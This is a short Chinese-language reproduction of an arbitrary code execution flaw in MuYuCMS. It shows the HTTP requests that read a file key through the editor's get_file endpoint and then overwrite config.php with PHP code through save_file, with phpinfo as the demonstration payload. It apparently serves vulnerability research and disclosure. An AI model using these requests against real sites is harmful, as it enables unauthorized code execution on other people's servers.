### 任意代码执行

#### 任意代码执行一

#### 漏洞复现

　　登录后构造数据包，读取config 文件内容

```
GET /editor/index.php?a=get_file&file_path=F:/Tools/phpstudy_pro/WWW/MuYuCMS-master/MuYuCMS-master/template/member_temp/user/config.php HTTP/
```

　　此时需要获取的并不是文件内容，而是更改之后文件的key

　　

![](../Images/4d10e02e55964016c959e59fb4010322.png "null")

　　复制文件校验码 替换到下面数据包中

```
GET /editor/index.php?a=save_file&file_path=F:/Tools/phpstudy_pro/WWW/MuYuCMS-master/MuYuCMS-master/template/member_temp/user/config.php&file_key=5e9c862ce52986e5437652d707c7c82f&file_content=<?php+phpinfo();+php?> HTTP/
```

　　

![](../Images/f8a418c099c3e5b0f21b1e0b065c3b7e.png "null")

　　访问文件在网站上对应的位置，发现代码已经被成功执行

　　

![](../Images/adb5c1b03bdcea7b8ca0020cedaeb92d.png "null")

　　`\app\admin\controller\Update::getFile`

　　

![](../Images/34852cabc314f138479bf213da581a29.png "null")
